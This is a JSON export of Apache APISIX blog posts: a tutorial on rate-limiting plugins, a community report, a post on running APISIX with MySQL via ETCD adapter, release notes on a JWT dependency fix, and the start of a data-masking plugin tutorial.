APISIX","metadata":{"permalink":"/blog/2023/08/14/rate-limit","source":"@site/blog/2023/08/14/rate-limit.md","title":"Rate Limit Your APIs With Apache APISIX","description":"A guide to using the rate limit plugins in Apache APISIX with some practical examples.","date":"2023-08-14T00:00:00.000Z","formattedDate":"August 14, 2023","tags":[{"label":"Plugins","permalink":"/blog/tags/plugins"}],"readingTime":7.11,"truncated":true,"authors":[{"name":"Navendu Pottekkat","title":"Author","url":"https://github.com/navendu-pottekkat","image_url":"https://avatars.githubusercontent.com/u/49474499","imageURL":"https://avatars.githubusercontent.com/u/49474499"}],"prevItem":{"title":"Biweekly Report (July 31 - August 13)","permalink":"/blog/2023/08/15/weekly-report"},"nextItem":{"title":"Biweekly Report (July 17 - July 30)","permalink":"/blog/2023/08/02/weekly-report"}},"content":"> In this article, we will look at examples of how we can use the rate limiting plugins in APISIX.\\n\\n\x3c!--truncate--\x3e\\n\\n<head>\\n    <link rel=\\"canonical\\" href=\\"https://navendu.me/posts/rate-limit/\\" />\\n</head>\\n\\nSetting up rate limits is a solid way to improve the reliability of your services.\\n\\nYou can ensure your services are not overloaded by setting up rate limits, providing consistent performance for the end users. It can also help enhance security by preventing denial-of-service (DoS) attacks which can take down your services.\\n\\nRate limiting can also be part of your business requirement where you want separate quotas for different tiers of users. For example, you can have a free version of your API where users can only make a small number of API calls and a paid version that allows ample API usage.\\n\\nIf you are using [Apache APISIX](https://apisix.apache.org) as your API gateway, you can leverage the rate limiting plugins, [limit-req](https://apisix.apache.org/docs/apisix/plugins/limit-req/), [limit-conn](https://apisix.apache.org/docs/apisix/plugins/limit-conn/), and [limit-count](https://apisix.apache.org/docs/apisix/plugins/limit-count/) to achieve this.\\n\\nYou can always set this up in your services directly without configuring it in APISIX. But as the number of your services increases, with each service having different constraints, setting up and managing different rate limits and updating them in each of these services becomes a pain point for development teams.\\n\\nIn this article, we will look at examples of how we can use the rate limiting plugins in APISIX. You can find the complete configuration files and instructions to deploy for this article in [this repository](https://github.com/navendu-pottekkat/rate-limit).\\n\\n## Rate Limit All Requests\\n\\nSetting up a rate limit for all your requests is a good place to start.\\n\\nAPISIX allows configuring [global rules](https://apisix.apache.org/docs/apisix/terminology/global-rule/) that are applied on all requests to APISIX. We can configure a global rule with the `limit-req` plugin, as shown below:\\n\\n```shell\\ncurl localhost:9180/apisix/admin/global_rules/rate_limit_all -X PUT -d \'\\n{\\n  \\"plugins\\": {\\n    \\"limit-req\\": {\\n      \\"rate\\": 30,\\n      \\"burst\\": 30,\\n      \\"key_type\\": \\"var\\",\\n      \\"key\\": \\"remote_addr\\",\\n      \\"rejected_code\\": 429,\\n      \\"rejected_msg\\": \\"rate limit exceeded!\\"\\n    }\\n  }\\n}\'\\n```\\n\\nThe configuration above will allow 30 requests per second (rate) to your upstream services. When the number of requests exceeds 30 but is under 60 (burst), the additional requests are delayed to match the 30 requests per second limit. If the number of requests exceeds 60, the additional requests are rejected. In short, the upstream services will always have a maximum of 30 requests per second.\\n\\nA global rate limit can be helpful when you want to set hard limits on the number of requests your upstream should receive in a second. But sometimes, you might want to rate limit the requests to a particular route instead of all requests.\\n\\nTo do this, you can configure the plugin on a specific route. The example below shows how you can configure the `limit-count` plugin on a particular route:\\n\\n```shell\\ncurl localhost:9180/apisix/admin/routes/rate_limit_route -X PUT -d \'\\n{\\n  \\"uri\\": \\"/api\\",\\n  \\"upstream\\": {\\n    \\"type\\": \\"roundrobin\\",\\n    \\"nodes\\": {\\n      \\"upstream:80\\": 1\\n    }\\n  },\\n  \\"plugins\\": {\\n    \\"limit-count\\": {\\n      \\"count\\": 10,\\n      \\"time_window\\": 60,\\n      \\"key_type\\": \\"var\\",\\n      \\"key\\": \\"remote_addr\\",\\n      \\"policy\\": \\"local\\",\\n      \\"rejected_code\\": 429,\\n      \\"rejected_msg\\": \\"rate limit exceeded!\\"\\n    }\\n  }\\n}\'\\n```\\n\\nThis will allow only ten requests in a minute, and this will be reset every minute.\\n\\nA global and route level limit combo can be used to set hard limits on top of use case-specific limits, which is particularly helpful in many practical scenarios. For example, you can configure the `limit-rate` plugin in a global rule based on how much traffic your upstream services can handle and then configure `limt-count` plugins on specific routes to handle business specific rate limits.\\n\\nIf the same plugin is configured globally and at a route level, the lower of the two is used by APISIX.\\n\\n## Limits for Consumers\\n\\nRate limiting all requests is cool, but most of you readers might want to be more granular with your limits. A typical scenario is configuring different limits for different consumers of your API. And APISIX achieves this through the aptly-named [consumer](https://apisix.apache.org/docs/apisix/terminology/consumer/) object.\\n\\nFor this example, we can create a consumer and use the [basic key authentication](https://apisix.apache.org/docs/apisix/plugins/key-auth/) provided by APISIX. We will then add the `limit-conn` plugin to this consumer. To create the consumer, send a request to the Admin API as shown:\\n\\n```shell\\ncurl localhost:9180/apisix/admin/consumers -X PUT -d \'\\n{\\n  \\"username\\": \\"alice\\",\\n  \\"plugins\\": {\\n    \\"key-auth\\": {\\n      \\"key\\": \\"beautifulalice\\"\\n    },\\n    \\"limit-conn\\": {\\n      \\"conn\\": 5,\\n      \\"burst\\": 3,\\n      \\"default_conn_delay\\": 0.1,\\n      \\"key_type\\": \\"var\\",\\n      \\"key\\": \\"remote_addr\\",\\n      \\"rejected_code\\": 429,\\n      \\"rejected_msg\\": \\"too many concurrent requests!\\"\\n    }\\n  }\\n}\'\\n```\\n\\nIn the route, we will just enable the `key-auth` plugin:\\n\\n```shell\\ncurl localhost:9180/apisix/admin/routes/rate_limit_consumer -X PUT -d \'\\n{\\n  \\"uri\\": \\"/api\\",\\n  \\"upstream\\": {\\n    \\"type\\": \\"roundrobin\\",\\n    \\"nodes\\": {\\n      \\"upstream:80\\": 1\\n    }\\n  },\\n  \\"plugins\\": {\\n    \\"key-auth\\": {}\\n  }\\n}\'\\n```\\n\\nWe can create a different consumer and set up a different rate limit as well:\\n\\n```shell\\ncurl localhost:9180/apisix/admin/consumers -X PUT -d \'\\n{\\n  \\"username\\": \\"bob\\",\\n  \\"plugins\\": {\\n    \\"key-auth\\": {\\n      \\"key\\": \\"bobisawesome\\"\\n    },\\n    \\"limit-conn\\": {\\n      \\"conn\\": 2,\\n      \\"burst\\": 1,\\n      \\"default_conn_delay\\": 0.1,\\n      \\"key_type\\": \\"var\\",\\n      \\"key\\": \\"remote_addr\\",\\n      \\"rejected_code\\": 429,\\n      \\"rejected_msg\\": \\"too many concurrent requests! please upgrade to increase this limit.\\"\\n    }\\n  }\\n}\'\\n```\\n\\nNow APISIX will limit the number of concurrent requests these consumers can make independently as desired.\\n\\n## Grouping Consumers\\n\\nConfiguring each consumer individually can be a tedious process. In addition to supporting third-party authentication providers like [Keycloak](https://apisix.apache.org/docs/apisix/plugins/authz-keycloak/) and [Casdoor](https://apisix.apache.org/docs/apisix/plugins/authz-casdoor/), APISIX has a consumer group object that lets you group individual consumers and apply configurations to the group.\\n\\nSo to apply rate limits to a group of consumers, we can create a consumer group object and add the `limit-count` plugin to it, as shown below:\\n\\n```shell\\ncurl localhost:9180/apisix/admin/consumer_groups/team_acme -X PUT -d \'\\n{\\n  \\"plugins\\": {\\n    \\"limit-count\\": {\\n      \\"count\\": 10,\\n      \\"time_window\\": 60,\\n      \\"key_type\\": \\"var\\",\\n      \\"key\\": \\"remote_addr\\",\\n      \\"policy\\": \\"local\\",\\n      \\"rejected_code\\": 429,\\n      \\"group\\": \\"team_acme\\"\\n    }\\n  }\\n}\'\\n```\\n\\nWe can also create a consumer group for consumers who are from another team on a different plan:\\n\\n```shell\\ncurl localhost:9180/apisix/admin/consumer_groups/team_rocket -X PUT -d \'\\n{\\n  \\"plugins\\": {\\n    \\"limit-count\\": {\\n      \\"count\\": 100,\\n      \\"time_window\\": 60,\\n      \\"key_type\\": \\"var\\",\\n      \\"key\\": \\"remote_addr\\",\\n      \\"policy\\": \\"local\\",\\n      \\"rejected_code\\": 429,\\n      \\"group\\": \\"team_rocket\\"\\n    }\\n  }\\n}\'\\n```\\n\\nWe can add consumers to these groups to attach the rate limit configuration:\\n\\n```shell\\ncurl localhost:9180/apisix/admin/consumers -X PUT -d \'\\n{\\n  \\"username\\": \\"eva\\",\\n  \\"plugins\\": {\\n    \\"key-auth\\": {\\n      \\"key\\": \\"everydayeva\\"\\n    }\\n  },\\n  \\"group_id\\": \\"team_acme\\"\\n}\'\\n```\\n\\nNow consumers in the `team_acme` group can only send ten requests per minute to your API, while consumers in the `team_rocket` group can send 100. So when `alice` from `team_acme` sends nine requests in a minute another user in the team, `bob` can only send one more request before the rate-limit quota is met.\\n\\n## Multi-Node Rate Limits\\n\\nIn many practical scenarios, you will have multiple instances of APISIX deployed for high availability. This could mean that a consumer of your API might be routed to different instances of APISIX for each request by the load balancer in front. In the context of rate limiting, what could go wrong here?\\n\\nWell, generally, APISIX tracks the rate limit in memory. And this could be problematic when using the `limit-count` plugin, where a consumer might be able to bypass the limit when there is a large enough number of APISIX nodes.\\n\\nA trivial solution here might be to set up sticky sessions in the load balancer so that each request gets sent to exactly a single node (on a side note, [this article](https://blog.frankel.ch/sticky-sessions-apache-apisix/1/) is excellent for learning how to set up sticky sessions with APISIX). But this could limit the scalability we are trying to achieve.\\n\\nA better way is to store the counter in a central location and have all APISIX nodes access it. So even if the load balancer routes to different nodes in each request, the same counter would be incremented each time. APISIX does this through [Redis](https://redis.io/).\\n\\n![Storing the counter in Redis](https://static.apiseven.com/uploads/2023/08/07/DrQ62A76_redis-counter.png)\\n\\nThe example below shows how you can configure this in a consumer group object:\\n\\n```shell\\ncurl localhost:9180/apisix/admin/consumer_groups/team_edward -X PUT -d \'\\n{\\n  \\"plugins\\": {\\n    \\"limit-count\\": {\\n      \\"count\\": 10,\\n      \\"time_window\\": 60,\\n      \\"key_type\\": \\"var\\",\\n      \\"key\\": \\"remote_addr\\",\\n      \\"policy\\": \\"redis\\",\\n      \\"redis_host\\": \\"redis\\",\\n      \\"redis_port\\": 6379,\\n      \\"redis_password\\": \\"password\\",\\n      \\"redis_database\\": 1,\\n      \\"redis_timeout\\": 1001,\\n      \\"rejected_code\\": 429,\\n      \\"group\\": \\"team_edward\\"\\n    }\\n  }\\n}\'\\n```\\n\\nYou can also use a Redis cluster instead of a single Redis service to make this more fault-tolerant:\\n\\n```shell\\ncurl localhost:9180/apisix/admin/consumer_groups/team_edward -X PUT -d \'\\n{\\n  \\"plugins\\": {\\n    \\"limit-count\\": {\\n      \\"count\\": 10,\\n      \\"time_window\\": 60,\\n      \\"key_type\\": \\"var\\",\\n      \\"key\\": \\"remote_addr\\",\\n      \\"policy\\": \\"redis-cluster\\",\\n      \\"redis_cluster_nodes\\": [\\"127.0.0.1:5000\\", \\"127.0.0.1:5001\\"],\\n      \\"redis_password\\": \\"password\\",\\n      \\"redis_cluster_name\\": \\"redis-cluster-1\\",\\n      \\"redis_timeout\\": 1001,\\n      \\"rejected_code\\": 429,\\n      \\"group\\": \\"team_edward\\"\\n    }\\n  }\\n}\'\\n```\\n\\nThat\'s a lot for this article! In the upcoming article, we will examine how APISIX implements rate limiting under the hood and its implications. To learn more about the rate limit plugins, see the documentation at [apisix.apache.org](https://apisix.apache.org/docs/apisix/next/plugins/limit-req/)."},{"id":"Biweekly Report (July 17 - July 30)","metadata":{"permalink":"/blog/2023/08/02/weekly-report","source":"@site/blog/2023/08/02/weekly-report.md","title":"Biweekly Report (July 17 - July 30)","description":"The Apache APISIX Community Biweekly Report can help community members better grasp the progress of the Apache APISIX community so that everyone can participate in the Apache APISIX community.","date":"2023-08-02T00:00:00.000Z","formattedDate":"August 2, 2023","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":2.295,"truncated":true,"authors":[],"prevItem":{"title":"Rate Limit Your APIs With Apache APISIX","permalink":"/blog/2023/08/14/rate-limit"},"nextItem":{"title":"Apache APISIX without etcd","permalink":"/blog/2023/07/27/apisix-without-etcd"}},"content":"> We have recently fixed or improved some features of Apache APISIX, including fixing `lua-resty-jwt` security issues, disallowing the simultaneous configuration of allowlist and denylist in ua-restriction, fixing the configuration of the `google-cloud-logging` plugin, and allowing the sending of headers upstream returned by OPA server. For more details, please read this biweekly report.\\n\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nApache APISIX grew up as a community from the first day it was open-sourced, and quickly became the most active open-source API gateway project in the world. These achievements are inseparable from the joint efforts of community partners.\\n\\nFrom 7.17 to 7.30, 16 contributors submitted 38 commits for Apache APISIX. Thank you for your contributions to Apache APISIX.\\n\\nWe have recently fixed and improved some features, and the summary of the updates is as follows:\\n\\n1. Upgraded `api7-lua-resty-jwt` to version 0.2.5.\\n\\n2. Allowlist and denylist cannot be enabled at the same time.\\n\\n3. Fixed the configuration of the `google-cloud-logging` plugin.\\n\\n4. Allowed sending headers upstream returned by OPA server.\\n\\n\\"If you want to go fast, go alone. If you want to go far, go together.\\" The Apache APISIX Community Biweekly Report can help community members better grasp the progress of the Apache APISIX community so that everyone can participate in the Apache APISIX community.\\n\\n## Contributor Statistics\\n\\n![Apache APISIX Contributors List](https://static.apiseven.com/uploads/2023/07/31/RIIPKarO_%E6%89%80%E6%9C%89%E8%B4%A1%E7%8C%AE%E8%80%85.png)\\n\\n![Apache APISIX New Contributors](https://static.apiseven.com/uploads/2023/07/31/kRFlqxZk_%E6%96%B0%E6%99%8B%E8%B4%A1%E7%8C%AE%E8%80%85.png)\\n\\n## Highlights of Recent Features\\n\\n### Apache APISIX\\n\\n- [Upgraded `api7-lua-resty-jwt` to version 0.2.5](https://github.com/apache/apisix/pull/9837) (Contributor: [Sn0rt](https://github.com/Sn0rt))\\n\\n- [Allowlist and denylist cannot be enabled at the same time](https://github.com/apache/apisix/pull/9841) (Contributor: [jiangfucheng](https://github.com/jiangfucheng))\\n\\n- [Fixed the configuration of the `google-cloud-logging` plugin](https://github.com/apache/apisix/pull/9622) (Contributor: [kindomLee](https://github.com/kindomLee))\\n\\n- [Allowed sending headers upstream returned by OPA server](https://github.com/apache/apisix/pull/9710) (Contributor: [Revolyssup](https://github.com/Revolyssup))\\n\\n## Recent Blog Recommendations\\n\\n- [Release Apache APISIX 3.4.1](https://apisix.apache.org/blog/2023/07/21/release-apache-apisix-3.4.1/)\\n\\n  We are pleased to present Apache APISIX 3.4.1 with a security patch for JWT.\\n\\n- [Accelerating API Gateway Excellence: Apache APISIX Community Meetup in Malaysia](https://apisix.apache.org/blog/2023/07/11/2023-apisix-meetup-malaysia/)\\n  \\n  Kuala Lumpur, the capital of Malaysia, witnessed the success of the 2023 APISIX open-source Community Meetup on July 4th.\\n\\n- [Release Apache APISIX 3.4.0](https://apisix.apache.org/blog/2023/06/30/release-apache-apisix-3.4.0/)\\n\\n  This release provides a new plugin loki-logger to forward logs to Grafana Loki, and allows for mTLS connection on the route level. In addition, the release also includes many other updates to continuously enhance the user experience of APISIX.\\n\\n- [Connecting IoT Devices to the Cloud with APISIX MQTT Proxy](https://apisix.apache.org/blog/2023/06/30/apisix-mqtt-proxy/)\\n\\n  APISIX\'s support for stream routes and, in extension, the MQTT protocol is often overlooked. Let\'s change this by looking at an end-to-end example of how APISIX can act as an MQTT proxy.\\n\\nA wealth of documentation tutorials and experience has been accumulated on the Apache APISIX official website and GitHub. If you encounter problems, you can look into the documentation, search keywords in the issues, or participate in the discussion on the issues, proposing your own ideas and practical experience."},{"id":"Apache APISIX without etcd","metadata":{"permalink":"/blog/2023/07/27/apisix-without-etcd","source":"@site/blog/2023/07/27/apisix-without-etcd.md","title":"Apache APISIX without etcd","description":"While a great database, etcd is not devoid of issues. In this post, I\'ll show how you can use Apache APISIX with MySQL.\\n","date":"2023-07-27T00:00:00.000Z","formattedDate":"July 27, 2023","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":5.225,"truncated":true,"authors":[{"name":"Nicolas Fr\xe4nkel","title":"Author","url":"https://github.com/nfrankel","image_url":"https://avatars.githubusercontent.com/u/752258","imageURL":"https://avatars.githubusercontent.com/u/752258"}],"prevItem":{"title":"Biweekly Report (July 17 - July 30)","permalink":"/blog/2023/08/02/weekly-report"},"nextItem":{"title":"Release Apache APISIX 3.2.2","permalink":"/blog/2023/07/23/release-apache-apisix-3.2.2"}},"content":">While a great database, etcd is not devoid of issues. In this post, I\'ll show how you can use Apache APISIX with MySQL.\\n\\n\x3c!--truncate--\x3e\\n\\n<head>\\n    <link rel=\\"canonical\\" href=\\"https://blog.frankel.ch/apisix-without-etcd/\\" />\\n</head>\\n\\n[etcd](https://etcd.io/) is an excellent key-value distributed database used internally by Kubernetes and managed by the CNCF. It\'s a great option, and that\'s the reason why Apache APISIX uses it too. Yet, it\'s not devoid of issues.\\n\\nFirst, some mention scalability, but one can expect this from a distributed data store that values consistency. Another issue may be the need for more familiarity with etcd. It\'s relatively new, so your Ops team may need help operating it correctly while having decades of operating MySQL or Postgres. Finally, only a few etcd users are aware that it lacks maintainers:\\n\\n>In the last few months, primary maintainers G.L. (Amazon, announcement) and S.B. (Red Hat) have stopped actively participating in the project. This leaves the project with only one active and two occasionally-reviewing maintainers, M.S. (Google),  P.T. (Google), both are relatively new to the project (1 month and 1 year of tenure) and S.P.Z. (IBM). Other maintainers are either dormant or have very minimal activity over the last six months. **The project is effectively unmaintained** _(emphasis mine)_.\\n>\\n>-- [Google Groups of Kubernetes Steering Committee, March 2022](https://groups.google.com/a/kubernetes.io/g/steering/c/e-O-tVSCJOk/m/N9IkiWLEAgAJ)\\n\\nFor all those reasons, you may prefer to use a standard SQL database with Apache APISIX. In this post, I\'ll show how you can use MySQL.\\n\\n## The kine project\\n\\nIt would be a lot of effort if each product had to introduce an abstraction layer and different adapters for both etcd and other databases. kine is a project that aims to offer a translation step between etcd calls and other implementations:\\n\\n> Kine is an etcdshim that translates etcd API to:\\n>\\n> * SQLite\\n> * Postgres\\n> * MySQL\\n> * NATS Jetstream\\n>\\n> **Features**\\n>\\n> * Can be ran standalone so any k8s (not just K3s) can use Kine\\n> * Implements a subset of etcdAPI (not usable at all for general purpose etcd)\\n> * Translates etcdTX calls into the desired API (Create, Update, Delete)\\n>\\n>-- [Kine (Kine is not etcd)](https://github.com/k3s-io/kine)\\n\\nIn essence, kine is a Go library that translates etcd calls to the datastore you want (among those implemented).\\n\\nYet, using kine directly is a non-trivial effort. Fortunately, [api7](https://api7.ai/), the company that gave Apache APISIX to the Apache Software Foundation, provides a component already focused on APISIX usage.\\n\\n## ETCD adapter\\n\\nETCD adapter wraps kine to be APISIX-specific:\\n\\n>ETCD Adapter mimics the ETCD V3 APIs best effort. It incorporates the kine as the Server side implementation, and it develops a totally in-memory watchable backend.\\n>\\n>Not all features in ETCD V3 APIs supported, this is designed for Apache APISIX, so it\'s inherently not a generic solution.\\n>\\n>-- [ETCD adapter](https://github.com/api7/etcd-adapter/)\\n\\nTwo things of note:\\n\\n* At the moment of this writing, the adapter supports either local in-memory storage or MySQL\\n* It\'s available as an embeddable library but also as a standalone component\\n\\nTherefore, we can design our architecture as the following:\\n\\n![Overall architecture](https://static.apiseven.com/uploads/2023/07/26/aioB38NC_overall-architecture.svg)\\n\\n## Demo\\n\\nLet\'s implement the above architecture with an additional admin UI over MySQL. I\'ll use Docker Compose:\\n\\n```yaml\\nversion: \\"3\\"\\n\\nservices:\\n  apisix:\\n    image: apache/apisix:3.4.0-debian                         #1\\n    volumes:\\n      - ./config.yaml:/usr/local/apisix/conf/config.yaml:ro\\n    ports:\\n      - \\"9080:9080\\"\\n      - \\"9180:9180\\"\\n    depends_on:\\n      - etcd-adapter\\n    restart: always                                           #2\\n  etcd-adapter:\\n    build: ./etcd-adapter                                     #3\\n    volumes:\\n      - ./adapter.yml:/etcd-adapter/conf/config.yaml:ro       #4\\n    depends_on:\\n      - mysql\\n    restart: always                                           #2\\n  mysql:\\n    image: bitnami/mysql:8.0                                  #5\\n    ports:\\n      - \\"3306:3306\\"\\n    environment:\\n      MYSQL_ROOT_PASSWORD: root\\n      MYSQL_USER: etcd\\n      MYSQL_PASSWORD: etcd\\n      MYSQL_DATABASE: apisix\\n  adminer:\\n    image: adminer:standalone                                 #6\\n    ports:\\n      - \\"8080:8080\\"\\n    environment:\\n      ADMINER_DEFAULT_SERVER: mysql\\n    depends_on:\\n      - mysql\\n```\\n\\n1. Latest version of Apache APISIX, yeah!\\n2. To avoid any failure with dependencies between containers, restart until it works. Kubernetes\'s manifests would involve health checks\\n3. api7.ai still needs to provide a container. We need to build from the source code\\n4. Override the default configuration file with a context-specific one\\n5. The regular MySQL image didn\'t work for me. Let\'s take the one from Bitnami\\n6. Adminer, formerly known as PHP myAdmin, will help to visualize the database state\\n\\nETCD-adapter\'s configuration looks like this:\\n\\n```yaml\\nserver:\\n  host: 0.0.0.0                 #1\\n  port: 12379\\n\\nlog:\\n  level: info\\n\\ndatasource:\\n  type: mysql                   #2\\n  mysql:\\n    host: mysql                 #3\\n    port: 3306                  #3\\n    username: etcd              #3\\n    password: etcd              #3\\n    database: apisix\\n```\\n\\n1. Bind any IP since Docker will assign a random one\\n2. Implementation type. The default is `btree`; we need to change it.\\n3. As configured in the `docker-compose.yml` file\\n\\nFinally, here\'s Apache APISIX configuration:\\n\\n```yaml\\ndeployment:\\n  admin:\\n    allow_admin:\\n      - 0.0.0.0/0\\n  etcd:\\n    host:\\n      - \\"http://etcd-adapter:12379\\"   #1\\n```\\n\\n1. Use this etcd instance, which is the adapter\\n\\n## Testing\\n\\nNow that we are set let\'s test our system by creating a route:\\n\\n```bash\\ncurl -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'{\\n  \\"methods\\": [\\"GET\\"],\\n  \\"uris\\": [\\"/get\\"],\\n  \\"upstream\\": {\\n    \\"nodes\\": {\\n      \\"httpbin.org:80\\": 1\\n    }\\n  }\\n}\' http://localhost:9180/apisix/admin/routes/1\\n```\\n\\nWe can now get it:\\n\\n```bash\\ncurl -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' http://localhost:9180/apisix/admin/routes/1\\n```\\n\\nWe can also check via the Adminer interface that it has been persisted via MySQL:\\n\\n![Adminer screenshot displaying the new route](https://static.apiseven.com/uploads/2023/07/26/PaAJJVIM_adminer.jpg)\\n\\nUnfortunately, we need to stop at this point. Getting all routes doesn\'t work:\\n\\n```bash\\ncurl -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' http://localhost:9180/apisix/admin/routes\\n```\\n\\n```json\\n{\\"header\\":{\\"revision\\":\\"1689689596\\"},\\"message\\":\\"Key not found\\"}\\n```\\n\\nWorse, using the route fails:\\n\\n```bash\\ncurl localhost:9080/get\\n```\\n\\n```json\\n{\\"error_msg\\":\\"404 Route Not Found\\"}\\n```\\n\\n## Conclusion\\n\\netcd is an excellent piece of infrastructure Kubernetes uses, but there might be better choices in some contexts. Worse, it might become a security threat in the future - or is already one, because of the lack of maintenance. Being able to move away from etcd is a considerable benefit.\\n\\nkine offers an etcd-compatible facade and multiple implementations. Using kine with Apache APISIX requires some adaptation effort, already done in ETCD-Adapter.\\n\\nCurrently, ETCD-Adapter is not feature-complete (to say the least) and requires more love. That\'s why it was not donated to the Apache Foundation yet. If you\'re a Go developer and are interested in the project, feel free to subscribe to the [Apache APISIX mailing list and/or join our Slack](https://apisix.apache.org/docs/general/join/) to offer your help.\\n\\nThe complete source code for this post can be found on GitHub:\\n\\n{% embed https://github.com/ajavageek/apisix-mysql %}\\n\\n**To go further:**\\n\\n* [Kine](https://github.com/k3s-io/kine)\\n* [ETCD Adapter](https://github.com/api7/ETCD-adapter)\\n* [Goodbye etcd, Hello PostgreSQL: Running Kubernetes with an SQL Database](https://martinheinz.dev/blog/100)"},{"id":"Release Apache APISIX 3.2.2","metadata":{"permalink":"/blog/2023/07/23/release-apache-apisix-3.2.2","source":"@site/blog/2023/07/23/release-apache-apisix-3.2.2.md","title":"Release Apache APISIX 3.2.2","description":"The Apache APISIX 3.2.2 version is released on July 23, 2023. This release includes a list of fixes and optimizations.","date":"2023-07-23T00:00:00.000Z","formattedDate":"July 23, 2023","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":1.185,"truncated":true,"authors":[{"name":"Xin Rong","title":"Author","url":"https://github.com/AlinsRan","image_url":"https://avatars.githubusercontent.com/u/79972061?v=4","imageURL":"https://avatars.githubusercontent.com/u/79972061?v=4"},{"name":"Traky Deng","title":"Technical Writer","url":"https://github.com/kayx23","image_url":"https://avatars.githubusercontent.com/u/39619599?v=4","imageURL":"https://avatars.githubusercontent.com/u/39619599?v=4"}],"prevItem":{"title":"Apache APISIX without etcd","permalink":"/blog/2023/07/27/apisix-without-etcd"},"nextItem":{"title":"Release Apache APISIX 3.4.1","permalink":"/blog/2023/07/21/release-apache-apisix-3.4.1"}},"content":"We are pleased to present Apache APISIX 3.2.2 with a list of fixes and optimizations.\\n\\n\x3c!--truncate--\x3e\\n\\n## Fixes\\n\\n### Upgrade `lua-resty-jwt` dependency version\\n\\nUpgrade `lua-resty-jwt` dependency version from `0.2.4` to `0.2.5` to mitigate the risk of authentication bypass in APISIX `jwt-auth` plugin. ([PR #9837](https://github.com/apache/apisix/pull/9837))\\n\\n### Implement optimizations for etcd\\n\\nSupport the use of one HTTP connection to watch the prefix for all etcd resources. This reduces the resource consumption and improved watch performance to be on par with gRPC connections. ([PR #9456](https://github.com/apache/apisix/pull/9456))\\n\\nEnable keep-alive connections for etcd calls. ([PR #9420](https://github.com/apache/apisix/pull/9420))\\n\\n### Fix the issue in `opentelemetry` and `grpc-transcode` plugins when used together\\n\\nFix the issue of `opentelemetry` and `grpc-transcode` plugins erroring out when used together. ([PR #9606](https://github.com/apache/apisix/pull/9606))\\n\\n### Fix memory leaks in upstream health check\\n\\nFix memory leaks in upstream health check when the upstream nodes are configured in domain names. ([PR #9090](https://github.com/apache/apisix/pull/9090))\\n\\n### Fix the issue in `wolf-rbac` plugin used with other plugins on consumer\\n\\nFix the issue of `wolf-rbac` plugin on consumer rendering other plugins on the consumer ineffective. ([PR #9298](https://github.com/apache/apisix/pull/9298))\\n\\n### Fix the issue of using `mqtt_client_id` as a key in load balancing\\n\\nFix the issue of using `mqtt_client_id` as a key in upstream load balancing. ([PR #9450](https://github.com/apache/apisix/pull/9450))\\n\\n### Fix the issue in `traffic-split` plugin host name resolution\\n\\nFix the issue where domain name configured in the `traffic-split` plugin is only resolved once. ([PR #9332](https://github.com/apache/apisix/pull/9332))\\n\\n## Changelog\\n\\nRead the changelog of this release [here](https://github.com/apache/apisix/blob/release/3.2/CHANGELOG.md#322)."},{"id":"Release Apache APISIX 3.4.1","metadata":{"permalink":"/blog/2023/07/21/release-apache-apisix-3.4.1","source":"@site/blog/2023/07/21/release-apache-apisix-3.4.1.md","title":"Release Apache APISIX 3.4.1","description":"The Apache APISIX 3.4.0 version is released on July 21, 2023. This version fixes a security vulnerability in JWT.","date":"2023-07-21T00:00:00.000Z","formattedDate":"July 21, 2023","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":0.305,"truncated":true,"authors":[{"name":"Guohao Wang","title":"Author","url":"https://github.com/Sn0rt","image_url":"https://avatars.githubusercontent.com/u/2706161?v=4","imageURL":"https://avatars.githubusercontent.com/u/2706161?v=4"},{"name":"Traky Deng","title":"Technical Writer","url":"https://github.com/kayx23","image_url":"https://avatars.githubusercontent.com/u/39619599?v=4","imageURL":"https://avatars.githubusercontent.com/u/39619599?v=4"}],"prevItem":{"title":"Release Apache APISIX 3.2.2","permalink":"/blog/2023/07/23/release-apache-apisix-3.2.2"},"nextItem":{"title":"Creating a Custom Data Mask Plugin","permalink":"/blog/2023/07/20/data-mask-plugin"}},"content":"We are pleased to present Apache APISIX 3.4.1 with a security patch for JWT.\\n\\n\x3c!--truncate--\x3e\\n\\n## Fix\\n\\n### Upgrade `lua-resty-jwt` dependency version\\n\\nUpgrade `lua-resty-jwt` dependency version from `0.2.4` to `0.2.5` to mitigate the risk of authentication bypass in APISIX `jwt-auth` plugin.\\n\\nThe issue is reported in [#9809](https://github.com/apache/apisix/issues/9809) and fixed in [PR #9837](https://github.com/apache/apisix/pull/9837).\\n\\n## Changelog\\n\\nRead the changelog of this release [here](https://github.com/apache/apisix/blob/release/3.4/CHANGELOG.md#341)."},{"id":"Creating a Custom Data Mask Plugin","metadata":{"permalink":"/blog/2023/07/20/data-mask-plugin","source":"@site/blog/2023/07/20/data-mask-plugin.md","title":"Creating a Custom Data Mask Plugin","description":"A tutorial on creating a custom Apache APISIX plugin in Lua through a real use case.","date":"2023-07-20T00:00:00.000Z","formattedDate":"July 20, 2023","tags":[{"label":"Plugins","permalink":"/blog/tags/plugins"}],"readingTime":9,"truncated":true,"authors":[{"name":"Zeping Bai","title":"Author","url":"https://github.com/bzp2010","image_url":"https://avatars.githubusercontent.com/u/8078418?v=4","imageURL":"https://avatars.githubusercontent.com/u/8078418?v=4"},{"name":"Navendu Pottekkat","title":"Author","url":"https://github.com/navendu-pottekkat","image_url":"https://avatars.githubusercontent.com/u/49474499","imageURL":"https://avatars.githubusercontent.com/u/49474499"}],"prevItem":{"title":"Release Apache APISIX 3.4.1","permalink":"/blog/2023/07/21/release-apache-apisix-3.4.1"},"nextItem":{"title":"Biweekly Report (July 03 - July 16)","permalink":"/blog/2023/07/18/weekly-report"}},"content":"> Creating a custom plugin for APISIX in Lua might be trivial or daunting, depending on your level of expertise in APISIX+OpenResty+Nginx. In this article, we will look at how you can create and run a custom plugin from the ground up while learning some basics of APISIX plugin development.\\n\\n\x3c!--truncate--\x3e\\n\\nWhen talking to one of our users from the fintech industry during the [Apache APISIX Community Meetup in Malaysia](https://www.youtube.com/watch?v=vRwAuvfZIgE), we came across a peculiar feature request: mask confidential data in responses.\\n\\nFor example, a response from the upstream might contain sensitive data like credit card numbers, and APISIX should be able to replace it with `*******` based on some predefined 